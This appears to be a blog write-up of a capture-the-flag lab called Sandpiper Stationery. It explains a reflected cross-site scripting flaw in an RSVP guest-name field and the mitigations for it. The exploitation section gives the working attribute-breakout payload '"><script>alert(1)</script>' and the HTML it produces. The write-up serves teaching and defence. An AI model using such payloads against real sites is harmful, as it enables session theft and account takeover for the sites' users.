---
title: "Cross-Site Scripting (XSS) – Attribute Breakout | Sandpiper Stationery"
date: 2026-05-28 00:00:00 +0530
categories: [A05 - Injection, Cross-Site Scripting (XSS)]
tags: [webversepro, xss, reflected-xss, attribute-breakout, html-injection, client-side]
author: Shivansh Sharma
image:
  path: /assets/images/posts/sandpiper-stationery-reflected-xss.webp
  alt: Cross-Site Scripting (XSS) – Attribute Breakout | Sandpiper Stationery
---

## Lab Link

Lab: [Sandpiper Stationery](https://dashboard.webverselabs-pro.com/challenges/sandpiper-stationery)

---

## Overview

Sandpiper Stationery is a boutique wedding-invitation studio with an RSVP preview feature. The application reflects the guest name back into the page so users can preview personalized invitation details.

The user-controlled value is inserted directly into an HTML attribute without proper context-aware encoding.

A basic script payload does not immediately execute because it remains inside the `value` attribute of an `<input>` element. However, by closing the attribute and injecting a script tag, an attacker can break out of the attribute context and execute JavaScript.

This challenge demonstrates a reflected Cross-Site Scripting vulnerability caused by unsafe attribute rendering.

---

## Objective

Identify the reflected guest-name parameter, escape the HTML attribute context, execute JavaScript, and retrieve the flag.

---

## Vulnerability Identification

This challenge is primarily a Reflected Cross-Site Scripting vulnerability.

### Classification Hierarchy

A05 - Injection
└── Client-Side Injection
└── Cross-Site Scripting (XSS)
└── Reflected XSS via Attribute Breakout

---

## Reconnaissance

Navigate to the RSVP preview page:

```text
https://95841cd2-4065-sandpiper-stationery-ccb7f.challenges.webverselabs-pro.com/rsvp
```

Submit a simple guest name:

```text
test
```

View the page source and locate the reflected value:

```html
<input class="sp-guest" type="text" name="guest" value="test" readonly autocomplete="off">
```

The guest value is reflected inside the `value` attribute of an HTML input element.

---

## Exploitation

### Step 1 - Test a Basic XSS Payload

Submit:

```html
<script>alert(1)</script>
```

No alert is triggered.

Viewing the page source shows:

```html
<input class="sp-guest" type="text" name="guest" value="<script>alert(1)</script>" readonly autocomplete="off">
```

The payload is present, but it is trapped inside the quoted `value` attribute.

Because the browser treats the content as an attribute value, the script tag is not parsed as executable HTML.

---

### Step 2 - Identify the Required Breakout

The vulnerable context is:

```html
value="USER_INPUT"
```

To execute JavaScript, the payload must:

1. Close the existing quote.
2. Close the input tag context.
3. Inject a script element.

---

### Step 3 - Inject the Attribute Breakout Payload

Use:

```html
"><script>alert(1)</script>
```

This results in:

```html
<input class="sp-guest" type="text" name="guest" value=""><script>alert(1)</script>" readonly autocomplete="off">
```

The payload closes the `value` attribute and creates a real `<script>` element in the document.

The browser then executes:

```javascript
alert(1)
```

---

### Step 4 - Retrieve the Flag

After successful JavaScript execution, the lab detects the XSS and displays the flag.

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

### Reflection Context

```html
<input class="sp-guest" type="text" name="guest" value="test" readonly autocomplete="off">
```

### Non-Executing Payload

```html
<script>alert(1)</script>
```

### Rendered Source

```html
<input class="sp-guest" type="text" name="guest" value="<script>alert(1)</script>" readonly autocomplete="off">
```

### Working Payload

```html
"><script>alert(1)</script>
```

### Resulting HTML

```html
<input class="sp-guest" type="text" name="guest" value=""><script>alert(1)</script>" readonly autocomplete="off">
```

### Flag

```text
WEBVERSE{.....}
```

---

## Impact

An attacker can execute arbitrary JavaScript in another user's browser.

Potential consequences include:

* Session theft
* Account takeover
* Credential harvesting
* Page manipulation
* Malicious redirects
* Data exfiltration
* CSRF bypass

Because the reflected value lands inside an HTML attribute, a payload must be crafted for that exact context.

---

## Mitigation

### Use Context-Aware Output Encoding

Attribute values require attribute-safe encoding.

For example:

```html
&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
```

instead of rendering raw input.

### Escape Quotes

Characters such as the following must be encoded inside attributes:

```text
"
'
<
>
&
```

### Use Safe Template Engines

Use frameworks that automatically escape output in HTML and attribute contexts.

### Avoid Direct String Concatenation

Do not build HTML using raw user input.

### Validate Input Format

For a guest name field, restrict input to expected characters such as:

```text
letters
spaces
hyphens
apostrophes
```

### Implement Content Security Policy

A strict CSP can reduce XSS impact.

---

## Real-World Insight

XSS prevention depends heavily on context.

A payload that does nothing inside an attribute can become dangerous once it breaks out of that attribute. This is why generic filtering is not enough.

The Sandpiper Stationery challenge demonstrates a core browser security lesson:

**The same input can be safe or dangerous depending entirely on where it is rendered.**
